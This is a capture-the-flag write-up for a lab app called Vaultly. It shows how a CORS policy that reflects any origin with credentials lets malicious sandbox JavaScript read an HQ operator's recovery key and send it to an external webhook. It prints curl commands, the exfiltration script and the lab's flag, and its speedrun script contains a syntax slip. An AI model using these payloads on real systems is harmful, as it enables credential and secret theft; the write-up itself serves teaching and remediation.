---
title: Vaultly - CORS Origin Reflection to HQ Recovery Key Exfil
tags:
  - bugforge
  - cors
  - cross-origin
  - credentials
  - sandbox
  - nextjs
  - webhook
  - chain
aliases:
  - "/bugforge/vaultly-cors/"
  - "/BugForge/Vaultly---CORS-Origin-Reflection"
---
- Vaultly - a multi-tenant secure document vault for teams (Next.js App Router). The weekly lab modelled on a real-world CORS misconfiguration
- The HQ ops endpoint `/api/hq/recovery` reflects any `Origin` header verbatim into `Access-Control-Allow-Origin` and sets `Access-Control-Allow-Credentials: true` - the worst CORS class
- Weaponized through the sandbox preview flow: publish a malicious app, an HQ operator opens it, the app's JS reads the operator's authenticated recovery key cross-origin, and beacons it to an external webhook
- The sandbox's own beacon channel (`/api/sandbox/hits`) never fires - a webhook is the exfil that works

## Enumeration

Set the target:

```bash
TARGET=<Bugforge IP>
```

### Application Fingerprinting

- Next.js App Router, Server Actions enabled
- Session auth via `vaultly_session` cookie (SameSite=lax, HttpOnly, Secure)
- Login/register are form-encoded (NOT JSON)
- Roles: viewer / editor / admin / owner - none of which is the `hq` role the `/api/hq/*` endpoints want
- Demo accounts listed on `/login` (password: `vaultly`) - all `@acme.test`

### Key Endpoints

| Method | Path | Auth | Notes |
|--------|------|------|-------|
| POST | /api/auth/register | none | Create org + user, sets `vaultly_session` |
| POST | /api/auth/login | none | Form-encoded email+password |
| GET | /dashboard | session | Normal user landing page |
| GET | /settings/sandbox | session | Sandbox UI - publish apps, request review, view beacons |
| POST | /api/sandbox/apps | session | Publish app `{"html":"..."}` -> `{"id":"...","url":"https://apps.vaultly-sandbox.dev/s/..."}` |
| POST | /api/support/review | session | Submit preview URL `{"url":"..."}` -> "HQ operator will open it shortly" |
| GET | /api/sandbox/hits | session | Returns `{"hits":[]}` - beacon readback (never fires in this lab) |
| GET | /api/hq/recovery | hq role only | **THE TARGET** - returns the break-glass recovery key |

### The /api/hq/recovery Wall

`GET /api/hq/recovery` with a normal session:

```
HTTP/1.1 403 Forbidden
Content-Type: application/json

{"error":"forbidden"}
```

Without a session it returns `401 {"error":"authentication_required"}`. With an admin demo account it still returns `403`. The endpoint requires a specific `hq` role that no user-registerable or demo account has. Only the HQ operator bot holds it.

## The CORS Oracle

The hint says: "Compare the response headers on the HQ ops endpoints when you send different Origin values."

Send `GET /api/hq/recovery` with different `Origin` headers and compare:

```bash
for ORIGIN in "https://evil.com" "https://apps.vaultly-sandbox.dev" "https://api.vaultly.app" "null"; do
  echo "=== Origin: $ORIGIN ==="
  curl -sk -D- -o /dev/null "$TARGET/api/hq/recovery" -H "Origin: $ORIGIN" \
    | grep -iE 'access-control|vary'
done
```

Result:

| Origin sent | `Access-Control-Allow-Origin` | `Access-Control-Allow-Credentials` | `Vary` |
|-------------|-------------------------------|-------------------------------------|--------|
| (none) | (absent) | (absent) | (absent) |
| `https://evil.com` | `https://evil.com` | `true` | `Origin` |
| `https://apps.vaultly-sandbox.dev` | `https://apps.vaultly-sandbox.dev` | `true` | `Origin` |
| `https://api.vaultly.app` | `https://api.vaultly.app` | `true` | `Origin` |
| `null` | `null` | `true` | `Origin` |

The server reflects **any** Origin verbatim into `Access-Control-Allow-Origin` and always sets `Access-Control-Allow-Credentials: true`. When no `Origin` header is sent, no CORS headers come back at all - the middleware only activates when it sees an `Origin`.

This is the textbook worst-case CORS misconfiguration:
- **ACAO reflects arbitrary origins** (no allowlist, no validation)
- **ACAC: true** means the browser sends the victim's cookies with the cross-origin request
- **Vary: Origin** confirms the server dynamically computes ACAO per request

Any cross-origin website can make a credentialed request to `/api/hq/recovery` and **read the response** - including the recovery key, if the victim holds the `hq` role.

## The Sandbox / Review Flow

The `/settings/sandbox` page describes the intended attack surface:

> Build a small preview app against the Vaultly API. Your app is hosted on the Sandbox content origin (`https://apps.vaultly-sandbox.dev`) and can call the API at `https://api.vaultly.app` with your session. Request a review and a Vaultly HQ operator will open your preview.

The flow is three steps:

1. **Publish an app** - `POST /api/sandbox/apps` with `{"html":"..."}` -> returns a preview URL at `https://apps.vaultly-sandbox.dev/s/<id>`
2. **Request an HQ review** - `POST /api/support/review` with the preview URL -> "An HQ operator will open it shortly"
3. **Preview beacons** - `GET /api/sandbox/hits` -> `{"hits":[]}` (each hit has `{query, body}` fields)

The HQ operator is a bot with the `hq` role. When you submit a review, the bot opens your preview URL in a real browser. The app's JavaScript runs in the sandbox origin (`https://apps.vaultly-sandbox.dev`) and can make cross-origin fetches to the Vaultly API.

The default app template fetches `https://api.vaultly.app/api/v1/me` with `credentials: 'include'` - that is the pattern to exploit, but pointed at `/api/hq/recovery` instead.

### Why the Sandbox Beacon Channel Does Not Work

The sandbox page says beacons appear in `GET /api/sandbox/hits`. The hit records have `{query, body}` fields - presumably the sandbox server logs requests made to the sandbox content host. In practice, polling `/api/sandbox/hits` after the operator opens the preview **always returns `{"hits":[]}`**. The beacon recording mechanism either requires a specific request shape that is not documented, or it is intentionally broken to force you to find another exfil channel.

This is the key insight: **do not rely on the sandbox beacon channel. Use an external webhook.**

## Weaponization

### The Attack Chain

```
[1] attacker publishes malicious sandbox app (JS fetches api.vaultly.app/api/hq/recovery with credentials)
[2] attacker submits preview URL for HQ review
[3] HQ operator bot opens the preview at apps.vaultly-sandbox.dev
[4] malicious JS runs in operator's browser:
      fetch('https://api.vaultly.app/api/hq/recovery', {credentials:'include'})
      -> operator's session cookie is sent (same-site: api.vaultly.app)
      -> CORS: ACAO reflects apps.vaultly-sandbox.dev + ACAC:true
      -> JS can READ the response (the recovery key)
[5] JS beacons stolen data to attacker's webhook.site URL
[6] attacker reads the webhook -> flag
```

### Why `api.vaultly.app` Works But the Target Host Does Not

The sandbox page says the app calls `https://api.vaultly.app`. Externally, `api.vaultly.app` is NXDOMAIN - but the HQ operator's browser resolves it internally (to `localhost:3000`). The operator's session cookie is set on the `api.vaultly.app` domain.

When the sandbox app (origin: `apps.vaultly-sandbox.dev`) fetches `api.vaultly.app/api/hq/recovery` with `credentials:'include'`:
- The cookie on `api.vaultly.app` is sent (it is a same-site request from the cookie's perspective - the fetch target IS `api.vaultly.app`)
- The CORS middleware on `api.vaultly.app` reflects the `Origin: https://apps.vaultly-sandbox.dev` header into ACAO + sets ACAC:true
- The browser allows the JS to read the response

If instead the app fetches the target host (`lab-XXXXX.labs-app.bugforge.io`), the `vaultly_session` cookie has `SameSite=lax` - cross-site subresource requests do not include it. The fetch hits the endpoint without a session and gets `401 authentication_required`. The CORS headers are still there, but there is no cookie to authenticate with.

**The operator's session lives on `api.vaultly.app`, not on the target host. That is why the sandbox page tells you to call `api.vaultly.app`.**

## Step-by-Step Walkthrough

### 0. Set the target

```bash
TARGET="https://lab-1786011246626-jw5626.labs-app.bugforge.io"
```

### 1. Register an account

You need a session to publish sandbox apps and submit reviews. Any account works - the demo accounts on `/login` (password: `vaultly`) or a fresh registration:

```bash
curl -sk -X POST "$TARGET/api/auth/register" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'orgName=Test&name=Op&email=admin@acme.test&password=vaultly' \
  -c /tmp/cookies.txt -o /dev/null
```

Or use a demo account:

```bash
curl -sk -X POST "$TARGET/api/auth/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'email=admin@acme.test&password=vaultly&next=/dashboard' \
  -c /tmp/cookies.txt -o /dev/null
```

Check the cookie:

```bash
SESSION=$(grep vaultly_session /tmp/cookies.txt | awk '{print $NF}')
echo "Session: $SESSION"
```

### 2. Confirm the CORS oracle

Verify the reflection before building the exploit:

```bash
curl -sk -D- -o /dev/null "$TARGET/api/hq/recovery" \
  -H "Origin: https://evil.com" | grep -i access-control
```

Expected:

```
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: https://evil.com
```

If you see those two headers, the oracle is live.

### 3. Create a webhook receiver

Go to [webhook.site](https://webhook.site) and create a new webhook. Save the URL:

```bash
WEBHOOK="https://webhook.site/YOUR-UUID-HERE"
```

This is your exfil channel. The sandbox beacon channel (`/api/sandbox/hits`) will not work - the webhook is what catches the stolen data.

### 4. Publish the malicious sandbox app

The app's JavaScript will:
1. Fetch `https://api.vaultly.app/api/hq/recovery` with `credentials:'include'`
2. Read the response text (the CORS misconfig allows this)
3. Beacon the response to the webhook URL

```bash
# Build the malicious HTML
HTML="<script>
async function go(){
  var w='${WEBHOOK}';
  var url='https://api.vaultly.app/api/hq/recovery';
  try {
    var r=await fetch(url,{credentials:'include'});
    var t=await r.text();
    new Image().src=w+'?s='+encodeURIComponent(url+'|'+t);
  } catch(e){
    new Image().src=w+'?e='+encodeURIComponent(url+'|'+e.message);
  }
}
go();
</script>"

# Publish it
PREVIEW=$(curl -sk -X POST "$TARGET/api/sandbox/apps" \
  -H "Content-Type: application/json" \
  -H "Cookie: vaultly_session=$SESSION" \
  -d "$(python3 -c "import json;print(json.dumps({'html':'''$HTML'''}))")" \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['url'])")

echo "Preview URL: $PREVIEW"
```

The response:

```json
{"id":"b2cfd11f6b1f66ca","url":"https://apps.vaultly-sandbox.dev/s/b2cfd11f6b1f66ca"}
```

### 5. Submit the preview for HQ review

```bash
curl -sk -X POST "$TARGET/api/support/review" \
  -H "Content-Type: application/json" \
  -H "Cookie: vaultly_session=$SESSION" \
  -d "{\"url\":\"$PREVIEW\"}"
```

Response:

```json
{"message":"Submitted for review. An HQ operator will open it shortly."}
```

### 6. Poll the webhook

The HQ operator opens the preview within a few seconds. Watch your webhook.site page, or poll the API:

```bash
# Extract the UUID from the webhook URL
WH_UUID=$(echo "$WEBHOOK" | sed 's|.*/||')

# Poll
for i in $(seq 1 10); do
  echo "--- Poll $i ---"
  curl -s "https://webhook.site/token/$WH_UUID/requests?sorting=new" \
    | python3 -c "
import sys,json
d=json.load(sys.stdin)
for r in d.get('data',[]):
    print('Query:', r.get('query',{}))
" 2>/dev/null
  sleep 3
done
```

The webhook receives the beaconed data:

```
Query: {'s': 'http://localhost:3000/api/hq/recovery|{"org":"Vaultly HQ","record":"break-glass","recovery_key":"bug{eG2wtBIvfno5DT4Xl1pir9Uc6KNpM4Nh}","note":"Emergency access key. Rotate after use."}'}
```

The `s` parameter contains the fetched URL (`http://localhost:3000/api/hq/recovery` - that is `api.vaultly.app` resolved internally) and the response body. The flag is in the `recovery_key` field.

### 7. Submit the flag

```
bug{eG2wtBIvfno5DT4Xl1pir9Uc6KNpM4Nh}
```

## TL;DR - Speedrun

```bash
TARGET="https://lab-XXXXX.labs-app.bugforge.io"
WEBHOOK="https://webhook.site/YOUR-UUID"

# 1. Login (demo account, password: vaultly)
SESSION=$(curl -sk -X POST "$TARGET/api/auth/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'email=admin@acme.test&password=vaultly&next=/dashboard' \
  -D- -o /dev/null | grep -i 'set-cookie: vaultly_session=' | sed 's/.*vaultly_session=//;s/;.*//')

# 2. Confirm the CORS oracle
curl -sk -D- -o /dev/null "$TARGET/api/hq/recovery" -H "Origin: https://evil.com" \
  | grep -i access-control

# 3. Publish the malicious app
HTML="<script>async function go(){var w='${WEBHOOK}';var r=await fetch('https://api.vaultly.app/api/hq/recovery',{credentials:'include'});var t=await r.text();new Image().src=w+'?s='+encodeURIComponent(r.url+'|'+t);}catch(e){new Image().src=w+'?e='+e;}go();</script>"
PREVIEW=$(curl -sk -X POST "$TARGET/api/sandbox/apps" \
  -H "Content-Type: application/json" -H "Cookie: vaultly_session=$SESSION" \
  -d "{\"html\":\"$HTML\"}" | python3 -c "import sys,json;print(json.load(sys.stdin)['url'])")

# 4. Submit for HQ review
curl -sk -X POST "$TARGET/api/support/review" \
  -H "Content-Type: application/json" -H "Cookie: vaultly_session=$SESSION" \
  -d "{\"url\":\"$PREVIEW\"}"

# 5. Read the webhook
WH_UUID=$(echo "$WEBHOOK" | sed 's|.*/||')
sleep 5
curl -s "https://webhook.site/token/$WH_UUID/requests?sorting=new" \
  | python3 -c "import sys,json;d=json.load(sys.stdin);print(d['data'][0]['query'])"
```

## Why This Worked

### Bug 1: CORS Origin Reflection with Credentials

The `/api/hq/recovery` endpoint (and the CORS middleware that guards it) reflects the `Origin` header verbatim into `Access-Control-Allow-Origin` without any allowlist check. It also sets `Access-Control-Allow-Credentials: true` unconditionally. This means:

- Any website can make a credentialed cross-origin request to this endpoint
- The browser sends the victim's cookies (because ACAC is true)
- The browser lets the attacker's JavaScript **read the response** (because ACAO matches the attacker's origin)

The CORS specification explicitly warns against this pattern. Reflecting the Origin header is only safe when combined with a strict allowlist AND when ACAC is false. Doing both wrong is the worst-case combination.

- CWE-942: Permissive Cross-domain Policy with Untrusted Domains
- The `Vary: Origin` header shows the server is intentionally dynamic - it knows it should vary by Origin, it just does not validate the value

### Bug 2: Sensitive Data on a CORS-Accessible Endpoint

The break-glass recovery key for the entire Vaultly HQ organization is served from a single GET endpoint with no additional protection beyond the role check. Once the CORS misconfig lets an attacker read the response, the key is exposed in plaintext. There is no rate limiting, no IP binding, no request signing - just a cookie-gated JSON response.

### Why the Sandbox Is the Perfect Delivery Vector

The sandbox preview flow is designed so that an HQ operator opens attacker-controlled HTML in a real browser. The operator's browser:
1. Has a valid session on `api.vaultly.app` (the internal API host)
2. Runs the attacker's JavaScript in the `apps.vaultly-sandbox.dev` origin
3. Can reach `api.vaultly.app` (which resolves to `localhost:3000` internally)

The attacker's JS makes a cross-origin fetch to `api.vaultly.app/api/hq/recovery` with `credentials:'include'`. The CORS middleware reflects the sandbox origin into ACAO + sets ACAC:true. The browser sends the operator's cookie and lets the JS read the response. The JS beacons the response to the attacker's webhook.

### Why the Target Host URL Fails But `api.vaultly.app` Works

The `vaultly_session` cookie on the target host has `SameSite=lax`. Cross-site subresource requests (fetch/XHR) do not include SameSite=lax cookies. So fetching the target host's `/api/hq/recovery` from the sandbox origin sends no cookie -> `401`.

But the operator's session cookie is on `api.vaultly.app`, not the target host. When the JS fetches `api.vaultly.app/api/hq/recovery`, the cookie on `api.vaultly.app` IS sent (the fetch target matches the cookie domain). The CORS misconfig on that endpoint (same backend, same middleware) reflects the sandbox origin and allows the read.

This is why the sandbox page tells you to call `api.vaultly.app` - that is where the operator's session lives.

### Why the Webhook Beats the Sandbox Beacon

The sandbox page advertises a beacon channel (`GET /api/sandbox/hits` with `{query, body}` records). In practice it never fires - either the recording mechanism requires an undocumented request shape, or it is intentionally disabled. An external webhook (webhook.site) is a reliable, controllable exfil channel that does not depend on the target's cooperation. Always have an independent exfil path when the target's built-in channel is unverified.

## Key Insight: The Oracle Hides in Plain Sight

The hint says "compare the response headers when you send different Origin values." The word "compare" is the key. A single request with `Origin: https://evil.com` shows `ACAO: https://evil.com` + `ACAC: true` - but without a baseline (no Origin header), you might think the CORS headers are always there. They are not. The middleware only activates when it sees an `Origin` header. Sending no Origin produces no CORS headers at all.

The "oracle" is that the response **changes** based on the Origin you send:
- No Origin -> no CORS headers (the endpoint is "dark" from a CORS perspective)
- Any Origin -> full CORS reflection with credentials

That difference is what makes it exploitable. If the server returned CORS headers unconditionally, the browser would still enforce the ACAO check. The reflection means whatever origin the attacker's malicious page runs on gets echoed back - and the browser trusts that.

## Security Takeaways

### Vulnerability

- CORS Origin reflection with `Access-Control-Allow-Credentials: true` on `/api/hq/recovery`
- The server reflects any `Origin` value into `Access-Control-Allow-Origin` without validation
- Combined with ACAC:true, any cross-origin site can read authenticated responses

### Impact

- Cross-origin theft of the HQ break-glass recovery key
- Any authenticated response from `/api/hq/*` is readable by arbitrary websites
- An attacker who gets an HQ operator to visit a crafted page steals the recovery key without any action from the operator beyond opening a link

### Root Cause

- The CORS middleware uses `Access-Control-Allow-Origin: <reflected Origin>` instead of an allowlist
- `Access-Control-Allow-Credentials: true` is set unconditionally
- No validation that the Origin is a trusted partner domain
- Sensitive secrets (recovery keys) are served from a GET endpoint protected only by a role check, with no defense-in-depth against cross-origin reads

### Remediation

- **Use an allowlist.** Maintain a strict list of trusted origins. Only set ACAO if the incoming Origin matches an entry. For single-origin apps, hardcode `Access-Control-Allow-Origin: https://your-app.com` or do not set it at all for same-origin requests.
- **Do not set ACAC:true unless you actually need cross-origin credentialed requests.** Most apps do not. If you do, the allowlist must be airtight.
- **Do not reflect the Origin header.** The pattern `res.header('Access-Control-Allow-Origin', req.headers.origin)` is a vulnerability unless wrapped in an allowlist check.
- **Defense in depth.** Sensitive endpoints like recovery key readout should not be GET requests readable by cross-origin JS. Use POST with a CSRF token, or serve them from a separate origin that has no CORS headers at all.
- **Sandbox untrusted content.** The sandbox preview host (`apps.vaultly-sandbox.dev`) should not be able to make credentialed requests to the API host. Content Security Policy `connect-src 'none'` on sandbox pages, or serve sandbox content from a separate cookieless domain.
